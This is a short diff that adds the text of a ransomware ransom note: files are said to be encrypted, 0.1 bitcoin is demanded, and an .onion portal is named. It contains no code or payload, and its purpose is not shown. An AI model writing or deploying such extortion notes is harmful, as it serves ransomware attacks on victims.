@@ -1,0 +1,3 @@
+Your files have been encrypted!
+To decrypt them send 0.1 bitcoin to the address below and visit our .onion portal.
+Do not rename files.
